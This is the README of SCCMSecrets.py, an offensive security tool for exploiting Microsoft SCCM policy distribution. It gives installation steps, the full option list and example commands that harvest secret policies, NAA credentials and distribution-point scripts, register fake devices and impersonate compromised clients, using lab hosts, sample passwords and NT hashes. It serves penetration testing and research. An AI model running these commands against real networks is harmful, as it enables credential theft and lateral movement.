# SCCMSecrets

SCCMSecrets.py is an SCCM policies exploitation tool. It goes beyond NAA credentials extraction, and aims to provide a comprehensive approach regarding SCCM policies exploitation. The tool can be executed from various levels of privileges, and will attempt to uncover potential misconfigurations related to policies distribution. It will dump the contents of all secret policies encountered as well as collection variables, in addition to package scripts hosted on the distribution points. Finally, it can be used throughout the intrusion process by configuring it to impersonate legitimate SCCM clients, in order to pivot across device collections.

For more details regarding the tool and its usage, see the associated article at:
https://www.synacktiv.com/publications/sccmsecretspy-exploiting-sccm-policies-distribution-for-credentials-harvesting-initial

# Installation

You can install SCCMSecrets.py by cloning the repository and installing the dependencies.
```
$ git clone https://github.com/synacktiv/SCCMSecrets
$ cd SCCMSecrets
$ python3 -m venv .venv && source .venv/bin/activate
$ python3 -m pip install -r requirements.txt
```

# Usage

```
$ python3 SCCMSecrets.py -h
                                                                                                                                                                                                                   
 Usage: SCCMSecrets.py [OPTIONS]                                                                                                                                                                                   
                                                                                                                                                                                                                   
╭─ Options ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
│ --distribution-point  -dp      TEXT  An SCCM distribution point [default: None]                                                                                                                                 │
│ --management-point    -mp      TEXT  The client's SCCM management point. Only necessary if the management point is not on the same machine as the distribution point [default: None]                            │
│ --username            -u       TEXT  A username for a domain account (can be a user account, or - preferably - a machine acount) [default: None]                                                                │
│ --password            -p       TEXT  The password for the domain account [default: None]                                                                                                                        │
│ --hash                -H       TEXT  The NT hash for the domain account (e.g. A4F49C406510BDCAB6824EE7C30FD852) [default: None]                                                                                 │
│ --verbose             -v             Enable verbose output                                                                                                                                                      │
│ --help                -h             Show this message and exit.                                                                                                                                                │
╰─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
╭─ Policies dump options ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
│ --skip-policies-dump   -sp               Do not perform secret policies dump                                                                                                                                    │
│ --client-name          -cn      TEXT     The name of the client that will be created in SCCM. An FQDN is expected (e.g. fake.corp.com) [default: None]                                                          │
│ --registration-sleep   -rs      INTEGER  The amount of time, in seconds, that should be waited after registrating a new device. A few minutes is recommended so that the new device can be added to device      │
│                                          collections (3 minutes by default, may need to be increased)                                                                                                           │
│                                          [default: 180]                                                                                                                                                         │
│ --use-existing-device  -d       TEXT     This option can be used to re-run SCCMSecrets.py using a previously registered device ; or to impersonate a legitimate SCCM client. In both cases, it expects the path │
│                                          of a folder containing a guid.txt file (the SCCM device GUID) and the key.pem file (the client's private key). Note that a client-name value must also be provided to  │
│                                          SCCMSecrets (but does not have to match the one of the existing device)                                                                                                │
│                                          [default: None]                                                                                                                                                        │
╰─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
╭─ DP file dump options ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
│ --skip-file-dump    -sf                            Do not perform Distribution Point file dump                                                                                                                  │
│ --index-method      -m       [datalib|bruteforce]  The method used to index files from the distribution point. Datalib should be preferred over bruteforce (the latter being less efficient and less            │
│                                                    exhaustive)                                                                                                                                                  │
│                                                    [default: datalib]                                                                                                                                           │
│ --index-file        -if      TEXT                  Use an existing indexing file previously produced by SCCMSecrets, which avoids re-indexing files from the Distribution Point. This option expects the        │
│                                                    'packages/index.json' file from an SCCMSecrets loot directory                                                                                                │
│                                                    [default: None]                                                                                                                                              │
│ --extensions        -e       TEXT                  Comma-separated list of extension that will determine which files will be downloaded when retrieving packages scripts. Provide an empty string to not        │
│                                                    download anything, and only index files                                                                                                                      │
│                                                    [default: .ps1, .bat, .xml, .txt, .pfx]                                                                                                                      │
│ --files             -f       TEXT                  A file containing a list of URLs (one per line) that should be downloaded from the Distribution Point. This is useful if you already indexed files and do    │
│                                                    not want to download by extension, but rather specific known files                                                                                           │
│                                                    [default: None]                                                                                                                                              │
│ --bruteforce-range  -bf      INTEGER               The number of package ID to bruteforce when indexing files through the bruteforce method. Between 0 (00000) and 1048575 (FFFFF) [default: 4095]              │
╰─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
```

# Examples

Below are some example commands.

Running SCCMSecrets.py without providing credentials (attempt to exploit automatic device approval for secret policies retrieval, attempt to exploit distribution point anonymous access for Distribution Point file dumping).
```
$ python3 SCCMSecrets.py --distribution-point 'mecm.sccm.lab/' --client-name test.sccm.lab -v
```
&nbsp;

Running SCCMSecrets.py with domain user credentials (attempt to exploit automatic device approval for secret policies retrieval, uses provided credentials or anonymous access for Distribution Point file dumping). Specify file extensions to whitelist for Distribution Point file dumping.
```
$ python3 SCCMSecrets.py --distribution-point 'mecm.sccm.lab/' --client-name test2.sccm.lab --extensions '.txt,.xml,.ps1,.pfx,.ini,.conf' --username 'franck' --password 'rockthee' -v
```
&nbsp;

Running SCCMSecrets.py with domain machine account credentials (register a new approved device allowing to dump secret policies, uses provided credentials or anonymous access for external resources dumping). Specify a longer time to wait after registration to ensure the enrolled device is successfully added to collections before requesting policies. Use the machine account hash for authentication
```
$ python3 SCCMSecrets.py --distribution-point 'mecm.sccm.lab/' --client-name test3.sccm.lab --registration-sleep 300 --username 'azule$' --hash '2B576ACBE6BCFDA7294D6BD18041B8FE' -v
```
&nbsp;

Running SCCMSecrets.py with domain user credentials. Skip secret policies enumeration. Specify a file with a list of URLs to download from the Distribution Point
```
$ python3 SCCMSecrets.py --distribution-point 'mecm.sccm.lab/' --skip-policies-dump --files loot/files.txt --username 'alice' --hash '8D97808FB46E01433322BD704EC9E160'
```
&nbsp;

Running SCCMSecrets.py with domain user credentials. Skip secret policies enumeration. Specify an existing index file to avoid re-indexing from Distribution Point. Download all **ps1** files.
```
$ python3 SCCMSecrets.py --distribution-point 'mecm.sccm.lab/' --skip-policies-dump --index-file loot/2024-09-28_00-42-23/packages/index.json --extensions '.ps1' --username 'alice' --password 'whiteRabbit' -v
```
&nbsp;

Running SCCMSecrets.py to impersonate a legitimate SCCM client that was compromised. The `CLIENT_DEVICE` folder contains a guid.txt file (GUID of the compromised client) and a key.pem file (the private key of the compromised client). Skip Distribution Point file dump.
```
$ python3 SCCMSecrets.py --distribution-point 'mecm.sccm.lab/' --client-name test4.sccm.lab --skip-file-dump --use-existing-device CLIENT_DEVICE/ -v
```
